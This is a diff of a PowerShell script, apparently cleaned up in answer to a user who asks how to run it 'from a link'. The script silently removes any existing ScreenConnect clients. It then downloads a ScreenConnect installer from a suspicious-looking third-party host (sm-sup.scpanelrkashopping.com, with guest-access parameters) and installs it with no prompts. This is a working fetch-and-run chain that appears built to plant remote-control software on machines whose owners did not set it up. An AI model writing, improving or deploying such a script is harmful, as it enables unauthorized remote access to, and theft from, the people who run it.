@@ -1,22 +1,60 @@
-# Uninstall all ScreenConnect clients
-Get-ChildItem HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*,
-HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
-Where-Object { $_.DisplayName -like "ScreenConnect Client*" } |
-ForEach-Object {
-    if ($_.UninstallString -match "{.*}") {
+# Requires PowerShell 5.1+
+
+$ErrorActionPreference = "Stop"
+
+# Remove existing ScreenConnect clients
+Write-Host "Removing old ScreenConnect clients..."
+
+$apps = Get-ChildItem `
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" ,
+    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
+    Where-Object {
+        $_.DisplayName -like "ScreenConnect Client*"
+    }
+
+foreach ($app in $apps) {
+    if ($app.UninstallString -match "\{[A-F0-9\-]+\}") {
         $guid = $matches[0]
-        Start-Process msiexec.exe -ArgumentList "/x $guid /qn /norestart" -Wait
+
+        Write-Host "Uninstalling $($app.DisplayName)..."
+
+        Start-Process -FilePath "msiexec.exe" `
+            -ArgumentList @("/x", $guid, "/qn", "/norestart") `
+            -Wait
     }
 }
 
-# Download your ScreenConnect agent
-$url = "https://sm-sup.scpanelrkashopping.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
-$msi = "$env:TEMP\ScreenConnect.msi"
+# Download ScreenConnect installer
+$url = "https://sm-sup.scpanelrkashopping.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=NEWWWWWW&c=&c=&c=&c=&c=&c=&c="
+$msi = Join-Path $env:TEMP "ScreenConnect.msi"
 
-Invoke-WebRequest $url -OutFile $msi
+Write-Host "Downloading..."
 
-# Install your ScreenConnect
-Start-Process msiexec.exe -ArgumentList "/i "$msi" /qn /norestart" -Wait
+Invoke-WebRequest `
+    -Uri $url `
+    -OutFile $msi `
+    -UseBasicParsing
 
-Remove-Item $msi -Force
-how can run this from link 
+if (!(Test-Path $msi)) {
+    throw "Failed to download installer."
+}
+
+Write-Host "Installing..."
+
+$process = Start-Process `
+    -FilePath "msiexec.exe" `
+    -ArgumentList @("/i", $msi, "/qn", "/norestart") `
+    -Wait `
+    -PassThru
+
+Write-Host "Installer Exit Code: $($process.ExitCode)"
+
+if ($process.ExitCode -ne 0) {
+    throw "Installation failed with exit code $($process.ExitCode)"
+}
+
+# Cleanup
+Remove-Item $msi -Force -ErrorAction SilentlyContinue
+
+Write-Host ""
+Write-Host "ScreenConnect installed successfully."
